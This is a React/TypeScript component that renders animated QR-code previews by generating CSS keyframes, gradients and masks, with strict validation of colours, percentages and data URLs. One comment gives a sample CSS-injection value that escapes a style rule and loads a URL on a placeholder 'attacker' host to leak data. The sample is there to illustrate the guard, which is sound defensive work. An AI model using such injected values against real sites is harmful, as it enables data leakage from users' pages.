import { useMemo } from 'react';
import type { CSSProperties } from 'react';
import type { StyleData, AnimationLayers } from './qr-types';
import { colorAtPhase, computeLogoTransform } from './qr-export-render';

let instanceCounter = 0;

interface Props {
  layers: AnimationLayers;
  style: StyleData;
  size: number;
}

// CSS injection guard. Every user-controllable value that gets
// concatenated into the dangerouslySetInnerHTML <style> below must pass
// through one of these. Without strict validation, a color value like
//   'red; } body { background: url(http://attacker/?leak); } .x {'
// would escape the rule and execute arbitrary CSS. We reject anything
// not matching the expected shape; one failure short-circuits the whole
// render rather than producing partial / malformed CSS.

const HEX_COLOR = /^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

function validHex(color: string): string | null {
  return HEX_COLOR.test(color) ? color : null;
}

function validPercent(n: number): number | null {
  return Number.isFinite(n) && n >= 0 && n <= 100 ? n : null;
}

function validPositive(n: number): number | null {
  return Number.isFinite(n) && n > 0 ? n : null;
}

// Data URLs from canvas.toDataURL() or FileReader. Anything else is
// rejected so we don't pass arbitrary URLs into mask-image / <img src>
// (which would otherwise permit fetching from any origin or sneaking
// quote chars).
function validDataUrl(url: string): string | null {
  return /^data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+$/.test(url) ? url : null;
}

interface ColorCss {
  // Full CSS for the QR-body color layer (@property + @keyframes + .qrag rule).
  css: string;
  // The background declaration alone, so the colored-logo layer can reuse
  // the exact same animated fill behind a logo-shaped mask.
  fillBlock: string;
  // The color animation shorthand value (duration name timing direction).
  colorAnimName: string;
}

export function QrAnimatedPreview({ layers, style, size }: Props) {
  const id = useMemo(() => instanceCounter++, []);

  // Color animation: an element whose animated background shows through a
  // mask. Returns the pieces so the same fill can drive both the QR body
  // (masked by the QR) and the logo (masked by the logo silhouette).
  const color = useMemo<ColorCss | null>(() => {
    if (!layers.colorMaskUrl || style.animationType === 'none') return null;

    const stops = style.animationStops;
    if (!Array.isArray(stops) || stops.length === 0) return null;

    const validatedStops = stops.map((s) => ({
      color: validHex(s.color),
      position: validPercent(s.position),
      positionEnd: validPercent(s.positionEnd),
      raw: s,
    }));
    if (
      validatedStops.some((s) => s.color === null || s.position === null || s.positionEnd === null)
    ) {
      return null;
    }
    const speed = validPositive(Math.max(style.animationSpeed, 1));
    const validSize = validPositive(size);
    const validMask = validDataUrl(layers.colorMaskUrl);
    if (speed === null || validSize === null || validMask === null) return null;

    const duration = (100 / speed) * 4;
    const v = (i: number) => `--qp${id}-${i}`;

    const dirCss =
      style.animationDirection === 'ccw'
        ? 'reverse'
        : style.animationDirection === 'alt'
          ? 'alternate'
          : 'normal';

    const timingCss =
      style.animationTimingFunction === 'ease' ||
      style.animationTimingFunction === 'ease-in' ||
      style.animationTimingFunction === 'ease-out' ||
      style.animationTimingFunction === 'ease-in-out'
        ? style.animationTimingFunction
        : 'linear';

    const colorAnimName = `${duration}s qra${id} ${timingCss} ${dirCss} infinite`;

    // Mask + sizing chunk for the QR body. Fills the relatively-positioned
    // wrapper so it registers exactly over the logo overlay.
    const maskBlock = `
  position: absolute;
  inset: 0;
  -webkit-mask-image: url("${validMask}");
  mask-image: url("${validMask}");
  -webkit-mask-size: contain;
  mask-size: contain;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  width: 100%;
  height: 100%;`;

    let defs: string;
    let fillBlock: string;

    if (style.animationType === 'pulse' || style.animationType === 'colorCycle') {
      const KEYFRAME_SAMPLES = 24;
      const colorVar = `--qpc${id}`;
      const isPulse = style.animationType === 'pulse';
      const phaseAt = (t: number) => (isPulse ? Math.pow(Math.sin(t * Math.PI), 2) : t);
      const initial = validatedStops[0]!.raw.color;
      const lines: string[] = [];
      for (let i = 0; i <= KEYFRAME_SAMPLES; i++) {
        const t = i / KEYFRAME_SAMPLES;
        const [r, g, b] = colorAtPhase(
          validatedStops.map((s) => s.raw),
          phaseAt(t),
        );
        const pct = (t * 100).toFixed(2);
        lines.push(`  ${pct}% { ${colorVar}: rgb(${r}, ${g}, ${b}); }`);
      }
      defs = `
@property ${colorVar} {
  syntax: '<color>';
  inherits: false;
  initial-value: ${initial};
}

@keyframes qra${id} {
${lines.join('\n')}
}`;
      fillBlock = `background-color: var(${colorVar});`;
    } else if (style.animationType === 'spiral') {
      const angleVar = `--qpa${id}`;
      const gradientStops = validatedStops.map((s) => `${s.color} ${s.position}%`).join(', ');
      defs = `
@property ${angleVar} {
  syntax: '<angle>';
  inherits: false;
  initial-value: 0deg;
}

@keyframes qra${id} {
  0% { ${angleVar}: 0deg; }
  100% { ${angleVar}: 360deg; }
}`;
      fillBlock = `background: conic-gradient(from var(${angleVar}), ${gradientStops});`;
    } else {
      // Band-based types: sweep / wave / radialLoop / breathe.
      const propertyDefs = validatedStops
        .map(
          (s, i) => `@property ${v(i)} {
  syntax: '<percentage>';
  inherits: false;
  initial-value: ${s.position}%;
}`,
        )
        .join('\n');
      const gradientStops = validatedStops.map((s, i) => `${s.color} var(${v(i)})`).join(', ');
      const kfFrom = validatedStops.map((s, i) => `${v(i)}: ${s.position}%;`).join(' ');
      const kfTo = validatedStops.map((s, i) => `${v(i)}: ${s.positionEnd}%;`).join(' ');

      let gradientFunc: string;
      switch (style.animationType) {
        case 'sweep':
          gradientFunc = `repeating-linear-gradient(90deg, ${gradientStops})`;
          break;
        case 'wave':
          gradientFunc = `repeating-linear-gradient(45deg, ${gradientStops})`;
          break;
        default:
          gradientFunc = `repeating-radial-gradient(${gradientStops})`;
          break;
      }
      defs = `
${propertyDefs}

@keyframes qra${id} {
  0% { ${kfFrom} }
  100% { ${kfTo} }
}`;
      fillBlock = `background: ${gradientFunc};`;
    }

    const css = `${defs}

.qrag${id} {
  ${fillBlock}
  animation: ${colorAnimName};${maskBlock}
}`;

    return { css, fillBlock, colorAnimName };
  }, [layers.colorMaskUrl, style, size, id]);

  // Logo transform keyframes (shared by the own-colors <img> overlay and
  // the colored-logo div). Sampled from the same computeLogoTransform() the
  // exports use, so preview and export match.
  const motion = style.logoAnimationType !== 'none';
  const logoDuration = (100 / Math.max(style.logoAnimationSpeed, 1)) * 4;

  const logoKfCss = useMemo(() => {
    if (!layers.logoLayerUrl || !motion) return '';
    const SAMPLES = 24;
    const lines: string[] = [];
    for (let i = 0; i <= SAMPLES; i++) {
      const t = i / SAMPLES;
      const { scaleX, scaleY, opacity } = computeLogoTransform(style.logoAnimationType, t);
      const pct = (t * 100).toFixed(2);
      lines.push(
        `  ${pct}% { transform: scale(${scaleX.toFixed(4)}, ${scaleY.toFixed(4)}); opacity: ${opacity.toFixed(4)}; }`,
      );
    }
    return `
@keyframes qralogo${id} {
${lines.join('\n')}
}

.qralogo${id} {
  animation: ${logoDuration}s qralogo${id} linear infinite;
  transform-origin: center;
}`;
  }, [layers.logoLayerUrl, style.logoAnimationType, logoDuration, motion, id]);

  const colorActive = !!color;
  const baseUrl = layers.baseImageUrl ? validDataUrl(layers.baseImageUrl) : null;
  const logoUrl = layers.logoLayerUrl ? validDataUrl(layers.logoLayerUrl) : null;

  // Color-over + motion: the logo is its own layer, filled by the same
  // animated color as the QR body (behind a logo-shaped mask) and given
  // the logo transform. Otherwise the logo layer carries its own colors.
  const logoColored = !!color && style.logoColorOver && motion && !!logoUrl;

  const logoFillCss =
    logoColored && color && logoUrl
      ? `
.qraglogofill${id} {
  ${color.fillBlock}
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  -webkit-mask-image: url("${logoUrl}");
  mask-image: url("${logoUrl}");
  -webkit-mask-size: contain;
  mask-size: contain;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  transform-origin: center;
  animation: ${color.colorAnimName}, ${logoDuration}s qralogo${id} linear infinite;
}`
      : '';

  // Nothing to animate (or the inputs failed validation) — render nothing
  // and let the static canvas show through.
  if (!colorActive && !baseUrl) return null;

  const fill: CSSProperties = {
    position: 'absolute',
    inset: 0,
    width: '100%',
    height: '100%',
    objectFit: 'contain',
  };

  return (
    <div
      style={{
        position: 'relative',
        width: '100%',
        maxWidth: '100%',
        maxHeight: '100%',
        aspectRatio: '1',
      }}
    >
      {color && <style dangerouslySetInnerHTML={{ __html: color.css }} />}
      {logoKfCss && <style dangerouslySetInnerHTML={{ __html: logoKfCss }} />}
      {logoFillCss && <style dangerouslySetInnerHTML={{ __html: logoFillCss }} />}

      {colorActive ? (
        <div
          className={`qrag${id}`}
          style={style.animationSpeed === 0 ? { animationPlayState: 'paused' } : undefined}
        />
      ) : baseUrl ? (
        <img src={baseUrl} alt="" style={fill} />
      ) : null}

      {logoColored ? (
        <div className={`qraglogofill${id}`} />
      ) : logoUrl ? (
        <img
          src={logoUrl}
          alt=""
          className={motion ? `qralogo${id}` : undefined}
          style={
            motion && style.logoAnimationSpeed === 0
              ? { ...fill, animationPlayState: 'paused' }
              : fill
          }
        />
      ) : null}
    </div>
  );
}
